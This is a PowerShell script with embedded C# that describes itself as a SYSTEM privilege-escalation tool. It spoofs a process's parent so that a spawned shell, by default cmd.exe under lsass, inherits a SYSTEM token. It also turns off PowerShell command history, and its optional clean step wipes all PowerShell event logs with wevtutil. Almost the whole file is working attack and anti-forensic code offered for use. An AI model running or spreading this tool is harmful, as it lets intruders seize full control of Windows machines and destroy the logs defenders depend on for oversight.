 <#
.SYNOPSIS
   Powershell/C# to spawn a process under a different parent process!

   Author: r00t-3xp10it
   Credits: C# borrowed from @decoder-it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Administrator privileges
   Optional Dependencies: Get-Process, wevtutil {native}
   PS cmdlet Dev version: v1.2.8

.DESCRIPTION
   Normally when a process launches a child process, it becomes the parent of the child process.
   If we create a new process setting also the parent process property, the child process will inherit
   the token of the specified parent process and impersonate this one. So if we create a new process,
   setting the parent PID the process owned by SYSTEM, we get a SYSTEM priv escalation technic! (EOP)

.NOTES
   We need to have elevated rights in order to create a process from the parent process handle,
   typically seDebugPrivilege which administrators have (note: if a regular user has this privilege
   too, he has the keys for the kingdom!). Keep in mind that this privilege is available only from
   an elevated command prompt.
   
.Parameter Filter
   Display process names by filtering token privs (default: false)
   
.Parameter Parent
   The parent process name to inherit tokens from (default: lsass)

.Parameter Child
   The child process to spawnm, absoluct path (default: $Env:WINDIR\system32\cmd.exe)

.Parameter CmdLine
   The cmdline to execute through the child process (default: false)

.Parameter LogFile
   The logfile to create absoluct\relative path (default: false)
   
.Parameter Clean
   Delete eventvwr Powershell/Operational logs? (default: false)
   
.EXAMPLE
   PS C:\> Get-Help .\psgetsys.ps1 -full
   Access this cmdlet comment based help
   
.EXAMPLE
   PS C:\> .\psgetsys.ps1 -Filter "NT AUTHORITY\SYSTEM"
   Query for processes with '<SYSTEM>' privileges attached.

.EXAMPLE
   PS C:\> .\psgetsys.ps1 -Filter "NT AUTHORITY\SYSTEM" -LogFile "psgetsys.log"
   Query for processes with '<SYSTEM>' privs attached and store data in logfile.
   
.EXAMPLE
   PS C:\> .\psgetsys.ps1 -Parent "random" -Child "$PSHOME\Powershell.exe"
   Let cmdlet auto-sellect the first '<SYSTEM>' process.Id to use as Parent.   

.EXAMPLE
   PS C:\> .\psgetsys.ps1 -Parent "explorer" -Child "$Env:WINDIR\system32\cmd.exe"
   Spawn child process (cmd) with privs inherit from parent process (SKYNET\pedro)

.EXAMPLE
   PS C:\> .\psgetsys.ps1 -Parent "lsass" -Child "$PSHOME\Powershell.exe"
   Spawn child process (PS) with privs inherit from parent process (NT AUTHORITY\SYSTEM)

.EXAMPLE
   PS C:\> .\psgetsys.ps1 -Parent "lsass" -Child "$Env:WINDIR\system32\cmd.exe" -CmdLine "cmd /c whoami > zzz.txt"
   Spawn child process (cmd) with privs inherit from parent process (lsass::SYSTEM) that silent executes -CmdLine
   
.INPUTS
   None. You cannot pipe objects into psgetsys.ps1   
   
.OUTPUTS
   * Checking module dependencies ..

   [+] Got Handle for ppid: 968 (lsass)
   [+] Updated process attribute list ..
   [+] Starting C:\WINDOWS\system32\cmd.exe...True - pid: 12564
   
   Responding Name    Id Description               UserName
   ---------- ----    -- -----------               --------
         True cmd  12564 Windows Command Processor NT AUTHORITY\SYSTEM

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://github.com/decoder-it/psgetsystem
#>


#Cmdlet Global parameters declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Child="$Env:WINDIR\system32\cmd.exe",
   [string]$LogFile="false",
   [string]$CmdLine="false",
   [string]$Parent="lsass",
   [string]$Filter="false",
   [string]$Clean="false"
)


$PPID = $PID
Write-Host "`n"
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

#Check for cmdlet mandatory dependencies!
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
If($IsClientAdmin -iMatch 'False')
{
   write-host "ERROR: Administrator privileges required to spoof processes!" -foregroundcolor red -BackgroundColor Black
   write-host "`n";exit #Exit @psgetsys
}


If($Filter -ne "false")
{

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Query for processes with specified '<TOKEN'> privs attached!
      
   .EXAMPLE 
      TOKEN: SKYNET\pedro
      TOKEN: NT AUTHORITY\SYSTEM
      TOKEN: NT AUTHORITY\SERVIÇO LOCAL
      TOKEN: NT AUTHORITY\Serviço de rede
      
   .OUTPUTS
      Responding Name       Id Description                        UserName
      ---------- ----       -- -----------                        --------
            True atieclxx 2024 AMD External Events Client Module  NT AUTHORITY\SYSTEM
            True atiesrxx 1644 AMD External Events Service Module NT AUTHORITY\SYSTEM
            True conhost  3972 Anfitrião de Janelas de Consolas   NT AUTHORITY\SYSTEM	 
   #>
      
   #Parsing query string data!
   If($Filter -Match '\\')
   {
      $RawBackupName = $Filter
      $Filter = $Filter -replace '\\','\\'
   }
   Else
   {
      $RawBackupName = $Filter
   }
   If($LogFile -ne "false")
   {
      Write-Host "    => logfile '$LogFile'" -foregroundcolor DarkCyan
      Start-Sleep -Seconds 2
   }

   #Build the output Table! {Exclude from query: Responding=False and Name=wlanext}  
   Get-Process -IncludeUserName | Select-Object Responding,Name,Id,Description,Username | Where-Object {
      $_.UserName -iMatch "$Filter" -and $_.Responding -iMatch 'True' -and $_.Name -iNotMatch 'wlanext' } |
      Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
         $stringformat = If($_ -iMatch '^(Responding)'){
            @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
         Write-Host @stringformat $_
   }

   If($LogFile -ne "false")
   {
      $GetDataLog = Get-Date -Format "hh:mm:ss"
      #Create LogFile in user specified absoluct\relative path!
      echo "[$GetDataLog] Filter: '$RawBackupName' Tokens!" > "$LogFile"
      Get-Process -IncludeUserName | Select-Object Responding,Name,Id,Description,Username | Where-Object {
         $_.UserName -iMatch "$Filter" -and $_.Responding -iMatch 'True' -and $_.Name -iNotMatch 'wlanext'
      } | Format-Table -AutoSize >> "$LogFile"
   }
   Write-Host "`n"
   exit #Exit @psgetsys

}


<#
.SYNOPSIS
   Author: r00t-3xp10it
   Helper - Impersonating tokens cmdlet settings!
#>

#Impersonating tokens cmdlet settings!
Write-Host "* Checking module dependencies .." -ForegroundColor Green
$GetParentPid = (Get-Process -Name $Parent -EA SilentlyContinue).Id | Select-Object -First 1
If(-not($GetParentPid) -or $GetParentPid -ieq $null)
{
   #Search for one '<SYSTEM>' process '<Id>' that can be used to elevate privileges!
   Write-Host "ERROR: not found '$Parent' process PID identifier!" -foregroundcolor red -BackgroundColor Black
   $GetParentPid = (Get-Process -IncludeUserName | Select-Object Username,Id,Responding | Where-Object { $_.UserName -iMatch "SYSTEM" -and $_.Responding -iMatch 'True' }).Id | Select-Object -First 1

      #Make sure we have any Parent.Id [int] returned!
      If(-not(GetParentPid) -or $GetParentPid -ieq $null)
      {
         Write-Host "ERROR: cant find a suitable 'SYSTEM::Responding' Parent PID .." -foregroundcolor red -BackgroundColor Black
         Write-Host "`n";exit #Exit @psgetsys
      }

   $GetToken = (Get-Process -Id $GetParentPid -IncludeUserName).Username ## <- Get 'new' process token privs!
   $Parent = (Get-Process -Id $GetParentPid -EA SilentlyContinue).ProcessName ## <- Get 'new' Parent process Name!
   Write-Host "    => Using '$GetToken' PPID $GetParentPid" -foregroundcolor DarkCyan ## <- Display settings onscreen!
}
If(-not(Test-Path -Path "$Child" -EA SilentlyContinue))
{
   #Child process absoluct path input not found! {defaulting to cmd.exe}
   Write-Host "ERROR: not found '$Child' Path .." -foregroundcolor red -BackgroundColor Black
   $Child = "$Env:WINDIR\system32\cmd.exe";Start-Sleep -Seconds 1
   Write-Host "    => Using child: '$Child'" -foregroundcolor DarkCyan
}
If($LogFile -ne "false")
{
   Write-Host "    => logfile '$LogFile'" -foregroundcolor DarkCyan
}
Write-Host ""


<#
.SYNOPSIS
   Author: C# sourcecode borrowed from @decoder-it
   Uri: https://github.com/decoder-it/psgetsystem
#>

$mycode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

public class MyProcess
{
    [DllImport("kernel32.dll")]
    static extern uint GetLastError();
    
	[DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

	public static void CreateProcessFromParent(int ppid, string command, string cmdargs)
    {
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NEW_CONSOLE = 0x00000010;
		const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
		

        var pi = new PROCESS_INFORMATION();
        var si = new STARTUPINFOEX();
        si.StartupInfo.cb = Marshal.SizeOf(si);
        IntPtr lpValue = IntPtr.Zero;
        Process.EnterDebugMode();
        try
        {
            
            var lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);
            var phandle = Process.GetProcessById(ppid).Handle;
            Console.WriteLine("[+] Got Handle for ppid: {0} ($Parent)", ppid); 
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, phandle);
            
            UpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);
            
            Console.WriteLine("[+] Updated process attribute list .."); 
            var pattr = new SECURITY_ATTRIBUTES();
            var tattr = new SECURITY_ATTRIBUTES();
            pattr.nLength = Marshal.SizeOf(pattr);
            tattr.nLength = Marshal.SizeOf(tattr);
            Console.Write("[+] Starting " + command  + "...");
			var b= CreateProcess(command, cmdargs, ref pattr, ref tattr, false,EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
			Console.WriteLine(b+ " - pid: " + pi.dwProcessId );
			
        }
        finally
        {
            
            if (si.lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
            }
            Marshal.FreeHGlobal(lpValue);
            
            if (pi.hProcess != IntPtr.Zero)
            {
                CloseHandle(pi.hProcess);
            }
            if (pi.hThread != IntPtr.Zero)
            {
                CloseHandle(pi.hThread);
            }
        }
    }

}
"@


#Add TypeDefinition {import}
Add-Type -TypeDefinition $mycode

#Set child process cmdline arguments?
If($CmdLine -ieq "false"){$CmdLine = ""}

try{
   #[MyProcess]::CreateProcessFromParent($args[0],$args[1],$cmdargs)
   [MyProcess]::CreateProcessFromParent($GetParentPid,"$Child","$CmdLine")
}catch{
   Write-Host "ERROR: fail to create Child process from Parent process!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "    => Sellect a diferent Parent process name, and try again!`n" -ForegroundColor DarkCyan
}


<#
.SYNOPSIS
   Author: r00t-3xp10it
   Helper - Display child process information onscreen!
   
.OUTPUTS
   * Checking module dependencies ..

   [+] Got Handle for ppid: 968 (lsass)
   [+] Updated process attribute list ..
   [+] Starting C:\WINDOWS\system32\cmd.exe...True - pid: 12564
   
   Responding Name    Id Description               UserName
   ---------- ----    -- -----------               --------
         True cmd  12564 Windows Command Processor NT AUTHORITY\SYSTEM
#>

$RawName = ($Child.Split('\\')[-1]) -replace '(.exe|.bat|.py|.ps1|.vbs)$',''
Get-Process -Name $RawName -IncludeUserName -EA SilentlyContinue | Select-Object Responding,Name,Id,Description,UserName | Where-Object {
   $_.Id -NotMatch "$PPID" } | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
      $stringformat = If($_ -iMatch '^(Responding)'){
         @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
      Write-Host @stringformat $_
}


If($LogFile -ne "false")
{

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Create LogFile in user specified absoluct\relative path!
   #>

   $GetDataLog = Get-Date -Format "hh:mm:ss"
   #Create LogFile in user specified absoluct\relative path!
   echo "[$GetDataLog] Child process information!" > "$LogFile"
   Get-Process -Name $RawName -IncludeUserName -EA SilentlyContinue | Select-Object Responding,Name,Id,Description,UserName | Where-Object {
      $_.Id -NotMatch "$PPID" } | Format-Table -AutoSize >> "$LogFile"

}


If($Clean -ieq "True")
{

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Delete all eventvwr powershell logfiles!
      
   .NOTES
      This function enumerates first all Powershell existing
      categories in local machine, then checks each indevidual
      categorie 'numberOfLogRecords' to decide if it deletes logs!
   #>
   
   #Build Categories List! {include all PS categories locations}
   $CleanPSlist = wevtutil el | Where-Object { $_ -iMatch 'Powershell' }
   
   ForEach($PSCategorie in $CleanPSlist)
   {
      Start-Sleep -milliseconds 600
      #Check-Number-Of-Logs in powershell diferent categories!
      $CheckNumberOfLogs = (wevtutil gli "$PSCategorie" | Where-Object { 
         $_ -iMatch 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
	 
      If($CheckNumberOfLogs -gt 0)
      {
         #Delete PS Logs from sellected categorie!
         wevtutil cl "$PSCategorie" | Out-Null
      }
   }  

}